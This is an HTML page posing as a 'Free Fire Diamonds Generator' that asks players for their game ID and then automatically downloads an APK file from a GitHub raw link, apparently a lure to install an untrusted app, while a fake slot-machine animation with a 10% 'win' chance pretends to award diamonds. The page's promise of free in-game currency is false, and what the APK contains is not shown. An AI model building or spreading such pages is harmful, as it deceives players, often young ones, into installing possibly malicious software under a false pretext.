<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamonds Downloader</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff0000, #000000);
            color: #ffffff;
            text-align: center;
            padding: 50px;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.7); margin-bottom: 20px;}
        input[type="text"] {
            padding: 10px; font-size: 1.2em; border: 2px solid #ff0000;
            border-radius: 5px; background:#333; color:#fff; width:300px; margin-bottom:20px;
        }
        button {
            padding:15px 30px; font-size:1.2em; background:#ff0000; color:#fff;
            border:none; border-radius:5px; cursor:pointer; text-transform:uppercase;
            font-weight:bold; box-shadow:0 4px 8px rgba(0,0,0,0.3);
            transition:background 0.3s;
        }
        button:hover {background:#cc0000;}
        button:disabled {background:#666; cursor:not-allowed;}
        .footer {margin-top:30px; font-size:0.9em; opacity:0.8;}
        .roller {
            margin-top:30px; font-size:1.5em; font-weight:bold; height:50px;
            display:flex; align-items:center; justify-content:center;
            background:rgba(0,0,0,0.5); border-radius:10px; padding:10px;
            width:300px; text-shadow:1px 1px 2px rgba(0,0,0,0.7);
            overflow:hidden; position:relative;
        }
        .slot-machine {display:flex; justify-content:space-around; width:100%; height:100%; align-items:center;}
        .slot {
            width:30%; height:100%; background:rgba(255,255,255,0.1);
            border-radius:5px; display:flex; align-items:center; justify-content:center;
            font-size:1.2em; position:relative; overflow:hidden;
        }
        .slot.rolling {animation:slotRoll 0.05s infinite;}
        @keyframes slotRoll {0%{transform:translateY(0);}100%{transform:translateY(-10px);}}
    </style>
</head>
<body>
    <h1>Free Fire Diamonds Generator</h1>
    <p>Enter your player ID, then click to download your free diamonds APK instantly!</p>
    <input type="text" id="userInput" placeholder="Type your Free Fire ID here">
    <button id="spinButton" onclick="spinAndDownload()">Spin for Free Diamonds</button>

    <div class="roller" id="resultRoller">
        <div class="slot-machine">
            <div class="slot" id="slot1">?</div>
            <div class="slot" id="slot2">?</div>
            <div class="slot" id="slot3">?</div>
        </div>
    </div>

    <div class="footer">
        <p>Powered by Free Fire vibes. This is for fun â€“ real diamonds need gameplay!</p>
    </div>

    <script>
        // YOUR APK DOWNLOAD LINK (already inserted)
        const apkUrl = "https://raw.githubusercontent.com/Ducky38994/Free-FF-Dimonds/refs/heads/main/freeffdimonds.apk";

        // Prevent multiple downloads
        if (localStorage.getItem('hasDownloaded')) {
            document.getElementById('spinButton').disabled = true;
            document.getElementById('spinButton').textContent = "Already Downloaded";
        }

        function spinAndDownload() {
            const input = document.getElementById('userInput').value.trim();
            if (!input) { alert("Please enter your Free Fire ID!"); return; }

            if (localStorage.getItem('hasDownloaded')) {
                alert("You can only download once!");
                return;
            }

            const btn = document.getElementById('spinButton');
            localStorage.setItem('hasDownloaded', 'true');
            btn.disabled = true;
            btn.textContent = "Downloading...";

            // INSTANT DOWNLOAD
            const a = document.createElement('a');
            a.href = apkUrl;
            a.download = "freeffdimonds.apk";
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(() => btn.textContent = "Download Started!", 600);

            // Visual slot animation
            rollSlots();
        }

        function rollSlots() {
            const slots = [document.getElementById('slot1'), document.getElementById('slot2'), document.getElementById('slot3')];
            const symbols = ["Diamond", "Cross", "Party", "Money", "Fire"];
            let counters = [0,0,0];
            const max = 30;

            slots.forEach(s => s.classList.add('rolling'));

            const intv = setInterval(() => {
                slots.forEach((s,i) => {
                    s.textContent = symbols[Math.floor(Math.random()*symbols.length)];
                    counters[i]++;
                });

                if (counters[0] >= max-10) slots[0].classList.remove('rolling');
                if (counters[1] >= max-5)  slots[1].classList.remove('rolling');
                if (counters[2] >= max) {
                    clearInterval(intv);
                    slots[2].classList.remove('rolling');

                    const won = Math.random() < 0.1;
                    const result = won ? "Diamond" : "Cross";
                    slots.forEach(s => s.textContent = result);

                    setTimeout(() => {
                        document.getElementById('resultRoller').innerHTML =
                            won ? "<div style='color:gold;'>You Won 200 Diamonds!</div>"
                                : "<div>Try Again Next Time!</div>";
                    }, 500);
                }
            }, 50);
        }
    </script>
</body>
</html>
